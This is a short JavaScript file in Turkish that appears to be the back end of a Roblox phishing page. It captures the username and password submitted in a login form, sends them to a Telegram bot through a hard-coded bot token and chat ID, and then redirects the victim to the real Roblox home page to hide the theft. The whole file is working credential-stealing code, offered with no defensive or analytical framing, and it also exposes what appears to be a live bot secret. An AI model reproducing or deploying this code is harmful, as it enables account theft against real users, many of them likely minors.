// Kesinleşmiş Bilgiler
const token = "8587670631:AAGkVl-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; //
const chatID = "8512406356"; //

document.getElementById('xf').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const u = document.getElementById('u').value;
    const p = document.getElementById('p').value;
    
    const mesaj = `🎯 GANİMET DÜŞTÜ!\n👤 User: ${u}\n🔑 Pass: ${p}`;
    
    // Tarayıcıdan direkt Telegram'a istek atıyoruz
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(mesaj)}`;

    fetch(url)
    .then(() => {
        // Mesaj gittikten sonra yönlendir
        window.location.replace("https://www.roblox.com/home");
    })
    .catch((err) => {
        console.error("Hata:", err);
        window.location.replace("https://www.google.com");
    });
});
